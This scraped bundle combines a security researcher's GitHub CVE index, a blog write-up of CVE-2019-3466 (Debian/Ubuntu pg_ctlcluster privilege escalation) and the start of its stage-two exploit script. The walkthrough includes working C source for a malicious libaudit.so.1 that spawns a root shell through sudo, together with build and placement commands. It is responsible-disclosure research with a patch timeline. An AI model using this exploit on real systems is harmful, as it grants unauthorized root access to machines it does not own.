  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmirchr%2Fsecurity-research)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=mirchr%2Fsecurity-research)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[mirchr](/mirchr)
/
**[security-research](/mirchr/security-research)**
Public

* [Notifications](/login?return_to=%2Fmirchr%2Fsecurity-research) You must be signed in to change notification settings
* [Fork
  27](/login?return_to=%2Fmirchr%2Fsecurity-research)
* [Star
   95](/login?return_to=%2Fmirchr%2Fsecurity-research)

Security Research

[blog.mirch.io](https://blog.mirch.io "https://blog.mirch.io")

[95
stars](/mirchr/security-research/stargazers) [27
forks](/mirchr/security-research/forks) [Branches](/mirchr/security-research/branches) [Tags](/mirchr/security-research/tags) [Activity](/mirchr/security-research/activity)
 [Star](/login?return_to=%2Fmirchr%2Fsecurity-research)

 [Notifications](/login?return_to=%2Fmirchr%2Fsecurity-research) You must be signed in to change notification settings

* [Code](/mirchr/security-research)
* [Issues
  0](/mirchr/security-research/issues)
* [Pull requests
  0](/mirchr/security-research/pulls)
* [Actions](/mirchr/security-research/actions)
* [Projects
  0](/mirchr/security-research/projects)
* [Security](/mirchr/security-research/security)
* [Insights](/mirchr/security-research/pulse)

Additional navigation options

* [Code](/mirchr/security-research)
* [Issues](/mirchr/security-research/issues)
* [Pull requests](/mirchr/security-research/pulls)
* [Actions](/mirchr/security-research/actions)
* [Projects](/mirchr/security-research/projects)
* [Security](/mirchr/security-research/security)
* [Insights](/mirchr/security-research/pulse)

# mirchr/security-research

   ¬†master[Branches](/mirchr/security-research/branches)[Tags](/mirchr/security-research/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit¬†History[34 Commits](/mirchr/security-research/commits/master/) | | |
| [vulnerabilities](/mirchr/security-research/tree/master/vulnerabilities "vulnerabilities") | | [vulnerabilities](/mirchr/security-research/tree/master/vulnerabilities "vulnerabilities") |  |  |
| [README.md](/mirchr/security-research/blob/master/README.md "README.md") | | [README.md](/mirchr/security-research/blob/master/README.md "README.md") |  |  |
| View all files | | |

## Repository files navigation

* README
# Security Research

A collection of files related to my personal security research. Additional content will be posted on my blog <https://blog.mirch.io>.

## Tools

| Tool | Description |
| --- | --- |
| [openssldir\_check](https://github.com/mirchr/openssldir_check/) | Windows utility to check for potential insecure paths used by the OPENSSLDIR build parameter in OpenSSL libraries |
| [ssscache2john](https://github.com/mirchr/ssscache2john/) | Convert SSSD LDAP cache files to John The Ripper format |
| [DumpTompcatSessions](https://github.com/mirchr/DumpTomcatSessions/) | Dump Tomcat sessions using JMX |

## Vulnerabilities

* CVE-2020-3950 - VMware Fusion Elevation of Privilege Vulnerability. PoC: [CVE-2020-3950.sh](/mirchr/security-research/blob/master/vulnerabilities/CVE-2020-3950.sh).
* CVE-2019-19954 - Signal Desktop Windows Elevation of Privilege Vulnerability. Detailed write-up: <https://blog.mirch.io/signal-desktop-windows-lpe>
* CVE-2019-3466 - Debian / Ubuntu PostgreSQL Privilege Escalation via pg\_ctlcluster. [CVE-2019-3466-stage1.sh](/mirchr/security-research/blob/master/vulnerabilities/CVE-2019-3466-stage1.sh) [CVE-2019-3466-stage2.sh](/mirchr/security-research/blob/master/vulnerabilities/CVE-2019-3466-stage2.sh). Detailed write-up: <https://blog.mirch.io/cve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation>. Debian Advisory: [DSA-4568](https://lists.debian.org/debian-security-announce/2019/msg00220.html). Ubuntu Advisory: [4194-1](https://usn.ubuntu.com/4194-1/)
* CVE-2019-12571 - PIA macOS Arbitrary File Overwrite. [CVE-2019-12571.txt](/mirchr/security-research/blob/master/vulnerabilities/PIA/CVE-2019-12571.txt).
* CVE-2019-12572 - PIA Windows Privilege Escalation: Malicious OpenSSL engine. [CVE-2019-12572.txt](/mirchr/security-research/blob/master/vulnerabilities/PIA/CVE-2019-12572.txt). Walk through <https://blog.mirch.io/2019/06/10/cve-2019-12572-pia-windows-privilege-escalation-malicious-openssl-engine/>
* CVE-2019-12573 - PIA Linux, macOS Arbitrary File Overwrite. [CVE-2019-12573.txt](/mirchr/security-research/blob/master/vulnerabilities/PIA/CVE-2019-12573.txt).
* CVE-2019-12574 - PIA Windows Privilege Escalation: DLL Injection. Detailed write-up: [CVE-2019-12574.txt](/mirchr/security-research/blob/master/vulnerabilities/PIA/CVE-2019-12574.txt).
* CVE-2019-12575 - PIA Linux, macOS Privilege Escalation: Shared Object Injection. [CVE-2019-12575.txt](/mirchr/security-research/blob/master/vulnerabilities/PIA/CVE-2019-12575.txt).
* CVE-2019-12576 - PIA macOS Privilege Escalation: Untrusted Search Path. [CVE-2019-12576.txt](/mirchr/security-research/blob/master/vulnerabilities/PIA/CVE-2019-12576.txt).
* CVE-2019-12577 - PIA macOS Privilege Escalation: Insecure umask. [CVE-2019-12577.txt](/mirchr/security-research/blob/master/vulnerabilities/PIA/CVE-2019-12577.txt).
* CVE-2019-12578 - PIA Linux Privilege Escalation: Argument Injection. [CVE-2019-12578.txt](/mirchr/security-research/blob/master/vulnerabilities/PIA/CVE-2019-12578.txt).
* CVE-2019-12579 - PIA Linux, macOS Privilege Escalation: Command Injection. [CVE-2019-12579.txt](/mirchr/security-research/blob/master/vulnerabilities/PIA/CVE-2019-12579.txt).
* CVE-2019-6617 - F5 BIG-IP Resource Administrator Privilege Escalation. [CVE-2019-6617.txt](/mirchr/security-research/blob/master/vulnerabilities/F5/CVE-2019-6617.txt). F5 Advisory: <https://support.f5.com/csp/article/K38941195>
* CVE-2019-6724 - Barracuda VPN Client Privilege Escalation on Linux and macOS. PoC: [CVE-2019-6724.sh](/mirchr/security-research/blob/master/vulnerabilities/CVE-2019-6724.sh). Detailed write-up: [CVE-2019-6724: Barracuda VPN Client Privilege Escalation on Linux and macOS](https://blog.mirch.io/2019/02/14/cve-2019-6724-barracuda-vpn-client-privilege-escalation-on-linux-and-macos/). Barracuda VPN Client [Release Notes](http://campus.barracuda.com/product/networkaccessclient/doc/78154149/release-notes-barracuda-vpn-client-for-linux/)
* CVE-2018-1792.sh - IBM MQ can allow an attacker to execute a privilege escalation attack on a local machine. PoC: [CVE-2018-1792.sh](/mirchr/security-research/blob/master/vulnerabilities/IBM/CVE-2018-1792.sh). Detailed write-up: [CVE-2018-1792 ‚Äì IBM MQ Privilege Escalation: Fun with RUNPATH](https://blog.mirch.io/2019/08/25/cve-2018-1792-ibm-mq-privilege-escalation-fun-with-runpath/). IBM Advisory: [ibm10734447](https://www-01.ibm.com/support/docview.wss?uid=ibm10734447)
* CVE-2018-15332 - F5 BIG-IP APM client for Linux and macOS arbitrary file takeover vulnerability. Detailed write-up: [CVE-2018-15332.txt](/mirchr/security-research/blob/master/vulnerabilities/F5/CVE-2018-15332.txt). F5 Advisory: [K12130880](https://support.f5.com/csp/article/K12130880)
* CVE-2018-5529, CVE-2018-5546 - F5 BIG-IP APM client for Linux and macOS vulnerability. Detailed write-up: [CVE-2018-5529.txt](/mirchr/security-research/blob/master/vulnerabilities/F5/CVE-2018-5529.txt). F5 Advisories: [K52171282](https://support.f5.com/csp/article/K52171282), [K54431371](https://support.f5.com/csp/article/K54431371)
* CVE-2018-18629 - Privilege Escalation on Linux via keybase-redirector . PoC: [CVE-2018-18629.sh](/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-18629.sh). Detailed write-up: [CVE-2018-18629: Keybase Linux privilege escalation](https://blog.mirch.io/2018/12/21/cve-2018-18629-keybase-linux-privilege-escalation/). Keybase Advisory: [Local Privilege Escalation on Linux via keybase-redirector (KB002)](https://keybase.io/docs/secadv/kb002)
* CVE-2018-19788 - PolicyKit (aka polkit) 0.115 that allows a user with a uid greater than INT\_MAX to successfully execute any systemctl command. PoC: [CVE-2018-19788.sh](/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh). Detailed write-up: [CVE-2018-19788 PoC ‚Äì polkit: Improper handling of user with uid > INT\_MAX leading to authentication bypass](https://blog.mirch.io/2018/12/09/cve-2018-19788-poc-polkit-improper-handling-of-user-with-uid-int_max-leading-to-authentication-bypass/). The Hacker News article: [Warning! Unprivileged Linux Users With UID > INT\_MAX Can Execute Any Command](https://thehackernews.com/2018/12/linux-user-privilege-policykit.html)
* CVE-2018-18556 - VyOS Privilege escalation via sudo pppd for operator users. PoC: [CVE-2018-18556.sh](/mirchr/security-research/blob/master/vulnerabilities/VyOS/CVE-2018-18556.sh). Detailed write-up: [CVE-2018-18556 ‚Äì VyOS Privilege escalation via sudo pppd for operator users](https://blog.mirch.io/2018/11/05/cve-2018-18556-vyos-privilege-escalation-via-sudo-pppd-for-operator-users). Advisory: [The "operator" level is proved insecure and will be removed in the next releases](https://blog.vyos.net/the-operator-level-is-proved-insecure-and-will-be-removed-in-the-next-releases)

## About

Security Research

[blog.mirch.io](https://blog.mirch.io "https://blog.mirch.io")

### Topics

[vulnerabilities](/topics/vulnerabilities "Topic: vulnerabilities")
[exploit-code](/topics/exploit-code "Topic: exploit-code")
[security-research](/topics/security-research "Topic: security-research")

### Resources

[Readme](#readme-ov-file)

[Activity](/mirchr/security-research/activity)
### Stars

[**95**
stars](/mirchr/security-research/stargazers)
### Watchers

[**6**
watching](/mirchr/security-research/watchers)
### Forks

[**27**
forks](/mirchr/security-research/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Fmirchr%2Fsecurity-research&report=mirchr+%28user%29)

## [Releases](/mirchr/security-research/releases)

No releases published

## [Packages 0](/users/mirchr/packages?repo_name=security-research)

No packages published

## Languages

* [Shell
  100.0%](/mirchr/security-research/search?l=shell)

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.



=== Content from blog.mirch.io_108cac58_20250121_014555.html ===

[Skip to content](#content)

* [Home](/)
* [Vulnerability Research](https://blog.mirch.io/cve/)
* [Github](https://github.com/mirchr/security-research)
* [Twitter](https://twitter.com/0xm1rch)
* [About](https://blog.mirch.io/about/)

Search for:

[Rich Mirch](https://blog.mirch.io "Rich Mirch")
# [Rich Mirch](https://blog.mirch.io/ "Rich Mirch")

## Penetration Tester, Red Teamer, Security Researcher

Menu

[CVE-2019-3466 Debian / Ubuntu Privilege Escalation via¬†pg\_ctlcluster ‚Äî November 15, 2019](https://blog.mirch.io/2019/11/15/cve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation/ "CVE-2019-3466 Debian / Ubuntu Privilege Escalation via¬†pg_ctlcluster")

[![](https://blog.mirch.io/wp-content/uploads/2019/11/debian-buster-postgres-root.png?w=712)](https://blog.mirch.io/2019/11/15/cve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation/ "CVE-2019-3466 Debian / Ubuntu Privilege Escalation via¬†pg_ctlcluster")

## [CVE-2019-3466 Debian / Ubuntu Privilege Escalation via¬†pg\_ctlcluster](https://blog.mirch.io/2019/11/15/cve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation/)

[November 15, 2019November 15, 2019](https://blog.mirch.io/2019/11/15/cve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation/ "6:54 am")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

# Vulnerability Summary

The [pg\_ctlcluster](https://manpages.debian.org/buster/postgresql-common/pg_ctlcluster.1.en.html) script in the postgresql-common package in Debian and Ubuntu is vulnerable to a local privilege escalation attack. pg\_ctlcluster is a script used to manage PostgreSQL instances.¬†A malicious actor with access to the postgres account can create arbitrary directories during startup or reload when called via systemd. This vulnerability can be leveraged to escalate privileges to root.

It‚Äôs important to note this is not a vulnerability in PostgreSQL and is specific to Debian, Ubuntu, or any system that consumes the Debian postgresql-common package.

A [fix](https://salsa.debian.org/postgresql/postgresql-common/commit/ec9d984b62ed79f61be97b786a9ff4381309979c)¬†is now available. Administrators should upgrade to the latest version of the postgresql-common package. See the Debian [security tracker](https://security-tracker.debian.org/tracker/source-package/postgresql-common) for details.

The vulnerability appears to have existed since 2013 based on the Debian Git history ([9dc97b,](https://salsa.debian.org/postgresql/postgresql-common/commit/9dc97be33f1f116ae6e2f17bd05cb6a2baf274a9)¬†[e97d16](https://salsa.debian.org/postgresql/postgresql-common/commit/e97d163c85c6df7e30ecc346eec007da2cd7e688)). I attempted to reproduce it on Wheezy but was unable to verify it due to unrelated technical issues standing up a test environment.

This proof of concept will show the ability to gain root privileges using the default

installation of¬† postgresql-common v200+deb10u2 along with postgresql-11 on Debian Buster. I have also verified the vulnerability on Ubuntu 19.04 with version 199 of the postgresql-common package.

---

## Walkthrough

The postgresql init script(/etc/init.d/postgresql) sources¬†[init.d-functions](https://salsa.debian.org/postgresql/postgresql-common/blob/master/debian/init.d-functions) which contain functions that call the pg\_ctlcluster script.¬†pg\_ctlcluster loads the following configuration files determined by the [Pgcommon](https://salsa.debian.org/postgresql/postgresql-common/blob/master/PgCommon.pm)¬†module.

* /etc/postgresql/cluster-version/cluster-name/pg\_ctl.conf
* /etc/postgresql/cluster-version/cluster-name/postgresql.conf
* /var/lib/postgresql/cluster-version/cluster-name/postgresql.auto.conf

These files are owned by the postgres user. The postgresql.auto.conf file will override the settings from /etc/postgresql. This file is created when the [alter system](https://www.postgresql.org/docs/current/sql-altersystem.html) command is executed.

pg\_ctlcluster contains logic to create directories for socketdir(defined in pg\_ctl.conf) and stats\_temp\_directory(defined in postgresql.conf). During a start or reload, if the directories defined in either of these variables do not exist, pg\_ctlcluster will create it and set the owner to the postgres user.

![debian-200-deb10u2-vuln-code](https://blog.mirch.io/wp-content/uploads/2019/11/debian-200-deb10u2-vuln-code.png?w=712)

Vulnerable code in 200+deb10u2

With the ability to create an arbitrary directory owned by the postgres user I set out to find a fast path to root. I executed the [strace(1)](http://man7.org/linux/man-pages/man1/strace.1.html)¬†utility on the sudo binary to see if there were any attempts to load shared objects from nonexistent locations.

```
postgres@debian:~$ strace -ff sudo 2>&1|grep '.so.' |grep -w ENOENT
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/usr/lib/sudo/tls/haswell/x86_64/libaudit.so.1", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/usr/lib/sudo/tls/haswell/libaudit.so.1", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/usr/lib/sudo/tls/x86_64/libaudit.so.1", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/usr/lib/sudo/tls/libaudit.so.1", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/usr/lib/sudo/haswell/x86_64/libaudit.so.1", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/usr/lib/sudo/haswell/libaudit.so.1", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/usr/lib/sudo/x86_64/libaudit.so.1", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/usr/lib/sudo/libaudit.so.1", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/usr/lib/sudo/libselinux.so.1", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/usr/lib/sudo/libutil.so.1", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/usr/lib/sudo/libpthread.so.0", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/usr/lib/sudo/libdl.so.2", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/usr/lib/sudo/libc.so.6", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)

```

I reviewed the list and decided that /usr/lib/sudo/haswell would be a good candidate.

```
postgres@debian:~$ ls -ld /usr/lib/sudo/haswell
ls: cannot access '/usr/lib/sudo/haswell': No such file or directory
```

At this point we have a privileged binary(sudo) attempting to load /usr/lib/sudo/haswell/libaudit.so.1 from a path does not exist. The goal now was to create this path, install a malicious libaudit.so.1 library and execute sudo. If all goes well a root shell will be spawned.

For the purpose of a simple PoC, I created a sudo rule to quickly restart the postgres service via systemd to demonstrate the vulnerability. In the real world this rule probably will not exist under the postgres account, however there could be other methods to induce a restart. Worse case an attacker would have to wait until the system was rebooted or some other event to cause the service to restart via systemd.

I automated the process by creating two scripts which can be found in my [Github](https://github.com/mirchr/security-research) repo. [CVE-2019-3466-stage1.sh](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2019-3466-stage1.sh) sets stats\_temp\_directory to /usr/lib/sudo/haswell. After a restart, [CVE-2019-3466-stage2.sh](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2019-3466-stage2.sh) builds a malicious libaudit.so.1 library,¬† stores it in /usr/lib/sudo/haswell, and executes sudo which spawns a root shell. Below is the source for libaudit.so.1 library. I had to add stubs for audit\_open() and audit\_log\_user\_message().

**Note:**¬†This has the potential to break sudo and should only be used in a controlled test environment. No attempt was made to make it reliable so use with caution.

```

/*
 * Author: Rich Mirch @0xm1rch
 * PoC for pg_ctlcluster arbitrary directory creation
 * gcc -fPIC -o woot.o -Wall -c woot.c
 * gcc -Wall -shared \
 *     -Wl,-soname,libaudit.so.1 \
 *     -Wl,-init,woot \
 *     -o /usr/lib/sudo/haswell/libaudit.so.1 woot.o
 * sudo
 */
#include
#include
#include

void audit_open()
{
  return;
}

void audit_log_user_message()
{
  return;
}

void woot(){
  setreuid(0,0);
  setregid(0,0);
  execl("/bin/sh","/bin/sh",NULL);
}

```

Screenshot showing the execution of stage 1, a restart, and stage 2 resulting in a root shell.

![debian-buster-postgres-root](https://blog.mirch.io/wp-content/uploads/2019/11/debian-buster-postgres-root.png?w=712)

## Timeline

* 2019-10-13: Report sent to Debian Security Team
* 2019-10-14: Debian acknowledges report
* 2019-11-13: Debian notified Ubuntu about upcoming release
* 2019-11-14: Debian releases advisory and patch

## References

* Debian Advisory: <https://www.debian.org/security/2019/dsa-4568>
* Ubuntu Advisory: <https://usn.ubuntu.com/4194-1/>
* PoC Exploit: [CVE-2019-3466-stage1.sh](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2019-3466-stage1.sh),¬†[CVE-2019-3466-stage2.sh](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2019-3466-stage2.sh)

### Share this:

* [Twitter](https://blog.mirch.io/2019/11/15/cve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation/?share=twitter "Click to share on Twitter")
* [Facebook](https://blog.mirch.io/2019/11/15/cve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation/?share=facebook "Click to share on Facebook")
Like Loading...
### *Related*

Categories: [Uncategorized](https://blog.mirch.io/category/uncategorized/)Tags: [Linux](https://blog.mirch.io/tag/linux/), [PostgreSQL](https://blog.mirch.io/tag/postgresql/), [vulnerability](https://blog.mirch.io/tag/vulnerability/)

## Post navigation

[CVE-2018-1792 ‚Äì IBM MQ Privilege Escalation: Fun with¬†RUNPATH](https://blog.mirch.io/2019/08/25/cve-2018-1792-ibm-mq-privilege-escalation-fun-with-runpath/)[CVE-2019-19954 Signal Desktop Windows Elevation of Privilege¬†Vulnerability](https://blog.mirch.io/2019/12/18/signal-desktop-windows-lpe/)

### Tags

[exploit](https://blog.mirch.io/tag/exploit/)
[hacking sudo](https://blog.mirch.io/tag/hacking-sudo/)
[Linux](https://blog.mirch.io/tag/linux/)
[PostgreSQL](https://blog.mirch.io/tag/postgresql/)
[sudo hacking](https://blog.mirch.io/tag/sudo-hacking/)
[vulnerability](https://blog.mirch.io/tag/vulnerability/)
[Follow Rich Mirch on WordPress.com](https://blog.mirch.io)

* [GitHub](https://github.com/mirchr)
* [LinkedIn](https://www.linkedin.com/in/mirchr/)

[Create a website or blog at WordPress.com](https://wordpress.com/?ref=footer_custom_svg "Create a website or blog at WordPress.com")

* Reblog
* Subscribe
  Subscribed

  + [![](https://s2.wp.com/i/logo/wpcom-gray-white.png) Rich Mirch](https://blog.mirch.io)

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fblog.mirch.io%252F2019%252F11%252F15%252Fcve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation%252F)
* Privacy
* + [![](https://s2.wp.com/i/logo/wpcom-gray-white.png) Rich Mirch](https://blog.mirch.io)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fblog.mirch.io%252F2019%252F11%252F15%252Fcve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation%252F)
  + [Copy shortlink](https://wp.me/paoR5j-5n)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://blog.mirch.io/2019/11/15/cve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation/)
  + [View post in Reader](https://wordpress.com/read/blogs/153687293/posts/333)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

##

##

Loading Comments...

Write a Comment...

Email (Required)

Name (Required)

Website

###

%d

![](https://pixel.wp.com/b.gif?v=noscript)



=== Content from github.com_0cbfaf52_20250121_014551.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmirchr%2Fsecurity-research%2Fblob%2Fmaster%2Fvulnerabilities%2FCVE-2019-3466-stage2.sh)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmirchr%2Fsecurity-research%2Fblob%2Fmaster%2Fvulnerabilities%2FCVE-2019-3466-stage2.sh)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=mirchr%2Fsecurity-research)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[mirchr](/mirchr)
/
**[security-research](/mirchr/security-research)**
Public

* [Notifications](/login?return_to=%2Fmirchr%2Fsecurity-research) You must be signed in to change notification settings
* [Fork
  27](/login?return_to=%2Fmirchr%2Fsecurity-research)
* [Star
   95](/login?return_to=%2Fmirchr%2Fsecurity-research)

* [Code](/mirchr/security-research)
* [Issues
  0](/mirchr/security-research/issues)
* [Pull requests
  0](/mirchr/security-research/pulls)
* [Actions](/mirchr/security-research/actions)
* [Projects
  0](/mirchr/security-research/projects)
* [Security](/mirchr/security-research/security)
* [Insights](/mirchr/security-research/pulse)

Additional navigation options

* [Code](/mirchr/security-research)
* [Issues](/mirchr/security-research/issues)
* [Pull requests](/mirchr/security-research/pulls)
* [Actions](/mirchr/security-research/actions)
* [Projects](/mirchr/security-research/projects)
* [Security](/mirchr/security-research/security)
* [Insights](/mirchr/security-research/pulse)

## Files

¬†master
## Breadcrumbs

1. [security-research](/mirchr/security-research/tree/master)
2. /[vulnerabilities](/mirchr/security-research/tree/master/vulnerabilities)
/
# CVE-2019-3466-stage2.sh

Copy path Blame  Blame
## Latest commit

## History

[History](/mirchr/security-research/commits/master/vulnerabilities/CVE-2019-3466-stage2.sh)executable file¬∑70 lines (58 loc) ¬∑ 1.35 KB¬†master
## Breadcrumbs

1. [security-research](/mirchr/security-research/tree/master)
2. /[vulnerabilities](/mirchr/security-research/tree/master/vulnerabilities)
/
# CVE-2019-3466-stage2.sh

Top
## File metadata and controls

* Code
* Blame

executable file¬∑70 lines (58 loc) ¬∑ 1.35 KB[Raw](https://github.com/mirchr/security-research/raw/refs/heads/master/vulnerabilities/CVE-2019-3466-stage2.sh)12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970#!/bin/bash# PoC for CVE-2019-3466# Author: Rich Mirch @0xm1rch# Blog: https://blog.mirch.io/cve-2019-3466-debian-ubuntu-pg\_ctlcluster-privilege-escalation## Usage:# ./CVE-2019-3466-stage1.sh# Restart postgresql via systemd# ./CVE-2019-3466-stage2.sh#umask 077
function cleanup { rm -f ${src?} ${target?} woot.o}
trap 'cleanup' EXIT ERR
src=$(mktemp /tmp/woot.XXXXXX.c)target=/usr/lib/sudo/haswell/libaudit.so.1
target\_dir=$(dirname ${target?})
if [[ ! -w ${target\_dir?} ]]then echo "ERROR: ${target\_dir?} is not writable; re-run stage1 and restart postgres as root" exit 1fi
